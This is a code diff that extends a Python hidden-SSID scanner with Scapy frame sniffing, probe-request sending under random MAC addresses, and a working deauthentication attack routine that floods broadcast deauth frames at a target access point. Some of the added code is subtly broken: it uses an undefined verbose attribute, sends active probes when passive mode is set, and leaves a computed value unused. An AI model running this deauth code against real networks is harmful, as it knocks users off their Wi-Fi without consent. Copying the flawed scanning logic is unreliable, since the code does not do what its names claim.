@@ -1,4 +1,8 @@
 #!/usr/bin/env python3
+"""
+Enhanced Hidden Networks Scanner with Scapy
+Advanced techniques for discovering hidden SSIDs using 802.11 frame analysis
+"""
 
 import subprocess
 import sys
@@ -7,18 +11,43 @@ import argparse
 import json
 import re
 import threading
+import random
+import signal
 from collections import defaultdict
 from datetime import datetime
 import os
 
+# Enhanced imports for Scapy-based analysis
+try:
+    from scapy.all import *
+    from scapy.layers.dot11 import *
+    import netifaces
+    SCAPY_AVAILABLE = True
+except ImportError:
+    print("Warning: Scapy not available. Some advanced features will be disabled.")
+    SCAPY_AVAILABLE = False
+
 
 class HiddenNetworkScanner:
-    def __init__(self, interface=None, timeout=30, passive_scan=False):
+    def __init__(self, interface=None, timeout=30, passive_scan=False, use_scapy=True):
         self.interface = interface
         self.timeout = timeout
         self.passive_scan = passive_scan
+        self.use_scapy = use_scapy and SCAPY_AVAILABLE
         self.networks = defaultdict(dict)
         self.hidden_networks = []
+        self.probe_requests = defaultdict(set)
+        self.scanning = False
+        self.clients = defaultdict(set)
+        self.deauth_enabled = False
+        
+        # Signal handling for graceful shutdown
+        signal.signal(signal.SIGINT, self._signal_handler)
+        signal.signal(signal.SIGTERM, self._signal_handler)
+    
+    def _signal_handler(self, signum, frame):
+        """Handle interrupt signals gracefully"""
+        print(f"\nReceived signal {signum}, stopping scan...")
         self.scanning = False
         
     def check_requirements(self):
@@ -204,6 +233,290 @@ class HiddenNetworkScanner:
         except Exception as e:
             print(f"Error in passive scan: {e}")
             return []
+    
+    def get_mac_vendor(self, mac):
+        """Get MAC address vendor information"""
+        try:
+            # Simple vendor identification based on OUI
+            oui = mac[:8].upper().replace(':', '')
+            vendor_db = {
+                '00:50:F2': 'Microsoft',
+                '00:0C:43': 'Ralink',
+                '00:1B:2F': 'Intel',
+                '00:25:00': 'Apple',
+                '00:13:CE': 'Cisco',
+                '00:0F:B5': 'Netgear',
+                '00:26:F2': 'Netgear',
+                '00:14:BF': 'Netgear',
+                '00:18:39': 'Cisco',
+                '00:1F:90': 'Cisco'
+            }
+            
+            for oui_prefix, vendor in vendor_db.items():
+                if mac.upper().startswith(oui_prefix):
+                    return vendor
+            return 'Unknown'
+        except:
+            return 'Unknown'
+    
+    def process_beacon(self, pkt):
+        """Process beacon frames to detect networks"""
+        if not pkt.haslayer(Dot11Beacon):
+            return
+            
+        bssid = pkt[Dot11].addr3
+        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
+        
+        # Get additional information
+        channel = int(ord(pkt[Dot11Elt:3].info))
+        signal_strength = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else 0
+        
+        # Check for hidden network
+        is_hidden = len(ssid) == 0 or ssid.isspace()
+        
+        network_info = {
+            'bssid': bssid,
+            'ssid': ssid if not is_hidden else '<hidden>',
+            'channel': channel,
+            'signal': signal_strength,
+            'hidden': is_hidden,
+            'vendor': self.get_mac_vendor(bssid),
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        # Parse security information
+        security_info = self.parse_security_info(pkt)
+        network_info.update(security_info)
+        
+        self.networks[bssid] = network_info
+        
+        if is_hidden:
+            self.hidden_networks.append(network_info)
+            
+        return network_info
+    
+    def process_probe_request(self, pkt):
+        """Process probe request frames to discover hidden networks"""
+        if not pkt.haslayer(Dot11ProbeReq):
+            return
+            
+        client_mac = pkt[Dot11].addr2
+        
+        # Extract SSID from probe request
+        if pkt.haslayer(Dot11Elt):
+            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
+            if ssid:
+                self.probe_requests[client_mac].add(ssid)
+                
+                # Check if this SSID corresponds to a hidden network
+                for bssid, network in self.networks.items():
+                    if network.get('hidden', False):
+                        # Try to correlate with hidden network
+                        self.correlate_probe_with_hidden(client_mac, ssid, bssid)
+    
+    def process_probe_response(self, pkt):
+        """Process probe response frames"""
+        if not pkt.haslayer(Dot11ProbeResp):
+            return
+            
+        bssid = pkt[Dot11].addr3
+        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
+        
+        # Update network information if we have a match
+        if bssid in self.networks:
+            if self.networks[bssid].get('hidden', False) and ssid:
+                self.networks[bssid]['ssid'] = ssid
+                self.networks[bssid]['hidden'] = False
+                print(f"Hidden network revealed: {bssid} -> {ssid}")
+    
+    def correlate_probe_with_hidden(self, client_mac, ssid, bssid):
+        """Correlate probe requests with hidden networks"""
+        # Add client to network
+        self.clients[bssid].add(client_mac)
+        
+        # If we have a hidden network and a client probing for an SSID,
+        # there's a chance they're related
+        if bssid in self.networks and self.networks[bssid].get('hidden', False):
+            confidence = self.calculate_correlation_confidence(client_mac, ssid, bssid)
+            if confidence > 0.7:  # High confidence threshold
+                self.networks[bssid]['probable_ssid'] = ssid
+                self.networks[bssid]['confidence'] = confidence
+                print(f"Probable SSID for {bssid}: {ssid} (confidence: {confidence:.2f})")
+    
+    def calculate_correlation_confidence(self, client_mac, ssid, bssid):
+        """Calculate confidence level for SSID correlation"""
+        # Simple confidence calculation based on multiple factors
+        confidence = 0.5  # Base confidence
+        
+        # Increase confidence if client is seen multiple times
+        if len(self.clients[bssid]) > 1:
+            confidence += 0.2
+            
+        # Increase confidence if SSID appears in multiple probe requests
+        probe_count = sum(1 for probes in self.probe_requests.values() if ssid in probes)
+        if probe_count > 1:
+            confidence += 0.1
+            
+        return min(confidence, 1.0)
+    
+    def parse_security_info(self, pkt):
+        """Parse security information from beacon/probe response"""
+        security_info = {'security': 'Open', 'encryption': False}
+        
+        if pkt.haslayer(Dot11Elt):
+            # Check for WPA/WPA2
+            elt = pkt[Dot11Elt]
+            while elt:
+                if elt.ID == 48:  # RSN (WPA2)
+                    security_info['security'] = 'WPA2'
+                    security_info['encryption'] = True
+                elif elt.ID == 221:  # WPA
+                    if elt.info.startswith(b'\x00\x50\xf2\x01'):
+                        security_info['security'] = 'WPA'
+                        security_info['encryption'] = True
+                
+                elt = elt.payload if hasattr(elt, 'payload') else None
+        
+        # Check for WEP
+        if pkt.haslayer(Dot11Beacon) and pkt[Dot11Beacon].cap & 0x10:
+            security_info['security'] = 'WEP'
+            security_info['encryption'] = True
+            
+        return security_info
+    
+    def packet_handler(self, pkt):
+        """Main packet handler for Scapy sniffing"""
+        if not self.scanning:
+            return
+            
+        try:
+            if pkt.haslayer(Dot11):
+                # Process different frame types
+                if pkt.haslayer(Dot11Beacon):
+                    self.process_beacon(pkt)
+                elif pkt.haslayer(Dot11ProbeReq):
+                    self.process_probe_request(pkt)
+                elif pkt.haslayer(Dot11ProbeResp):
+                    self.process_probe_response(pkt)
+                    
+        except Exception as e:
+            if self.verbose:
+                print(f"Error processing packet: {e}")
+    
+    def send_probe_requests(self, interface, target_ssids=None):
+        """Send probe requests to discover hidden networks"""
+        if not self.use_scapy:
+            print("Scapy not available for probe requests")
+            return
+            
+        # Common SSIDs to probe for
+        common_ssids = [
+            "linksys", "netgear", "dlink", "tplink", "asus", "buffalo",
+            "cisco", "apple", "android", "iphone", "samsung", "lg",
+            "home", "office", "guest", "wifi", "wireless", "network",
+            "router", "modem", "internet", "broadband", "default"
+        ]
+        
+        if target_ssids:
+            ssids_to_probe = target_ssids
+        else:
+            ssids_to_probe = common_ssids
+            
+        print(f"Sending probe requests for {len(ssids_to_probe)} SSIDs...")
+        
+        for ssid in ssids_to_probe:
+            try:
+                # Create probe request packet
+                probe_req = (
+                    RadioTap() /
+                    Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", 
+                          addr2=RandMAC(), addr3="ff:ff:ff:ff:ff:ff") /
+                    Dot11ProbeReq() /
+                    Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+                )
+                
+                # Send the packet
+                sendp(probe_req, iface=interface, verbose=False)
+                time.sleep(0.1)  # Small delay between probes
+                
+            except Exception as e:
+                if self.verbose:
+                    print(f"Error sending probe for {ssid}: {e}")
+    
+    def perform_deauth_attack(self, target_bssid, client_mac=None, count=10):
+        """Perform deauthentication attack (for educational purposes)"""
+        if not self.deauth_enabled:
+            print("Deauth attacks are disabled. Enable with --enable-deauth")
+            return
+            
+        if not self.use_scapy:
+            print("Scapy not available for deauth attacks")
+            return
+            
+        print(f"WARNING: Performing deauth attack on {target_bssid}")
+        print("This is for educational purposes only!")
+        
+        # If no specific client, use broadcast
+        if not client_mac:
+            client_mac = "ff:ff:ff:ff:ff:ff"
+            
+        try:
+            # Create deauth packet
+            deauth = (
+                RadioTap() /
+                Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) /
+                Dot11Deauth(reason=7)
+            )
+            
+            # Send deauth packets
+            for i in range(count):
+                sendp(deauth, iface=self.interface, verbose=False)
+                time.sleep(0.1)
+                
+            print(f"Sent {count} deauth packets")
+            
+        except Exception as e:
+            print(f"Error performing deauth attack: {e}")
+    
+    def scapy_scan(self, interface, duration=30):
+        """Perform Scapy-based wireless scanning"""
+        if not self.use_scapy:
+            print("Scapy not available for advanced scanning")
+            return []
+            
+        print(f"Starting Scapy-based scan on {interface} for {duration} seconds...")
+        
+        self.scanning = True
+        
+        # Start packet capture in a separate thread
+        def capture_packets():
+            try:
+                sniff(iface=interface, prn=self.packet_handler, 
+                      timeout=duration, store=0)
+            except Exception as e:
+                print(f"Error during packet capture: {e}")
+        
+        capture_thread = threading.Thread(target=capture_packets)
+        capture_thread.daemon = True
+        capture_thread.start()
+        
+        # Send probe requests in parallel
+        if self.passive_scan:
+            probe_thread = threading.Thread(
+                target=self.send_probe_requests, 
+                args=(interface,)
+            )
+            probe_thread.daemon = True
+            probe_thread.start()
+        
+        # Wait for scanning to complete
+        time.sleep(duration)
+        self.scanning = False
+        
+        # Wait for threads to complete
+        capture_thread.join(timeout=2)
+        
+        return list(self.networks.values())
     
     def scan_networks(self):
         """Main network scanning function"""
